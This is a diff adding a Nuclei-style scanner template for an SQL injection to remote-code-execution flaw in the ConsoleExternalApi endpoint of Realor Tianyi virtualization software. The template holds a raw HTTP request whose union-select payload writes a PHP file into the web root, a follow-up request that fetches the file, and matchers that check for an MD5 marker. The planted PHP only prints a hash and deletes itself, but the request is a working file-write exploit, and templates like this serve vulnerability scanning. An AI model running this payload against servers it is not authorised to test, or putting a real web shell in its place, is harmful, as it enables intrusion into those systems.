@@ -1,0 +1,27 @@
+id: realor-consoleexternalapi-sql2rce
+
+info:
+  name: 瑞友天翼虚拟化 ConsoleExternalApi接口 sql注入
+  author: H0nayuzu
+  severity: critical
+  tags: sql,rce
+
+http:
+  - raw:
+      - |
+        POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"account": "1' union select '<?php echo(md5(123));unlink(__FILE__);?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\{{randstr}}.xgi'#","userPwd": "1"}
+      
+      - |
+        GET /{{randstr}}.xgi HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"202cb962ac59075b964b07152d234b70")
+        condition: and
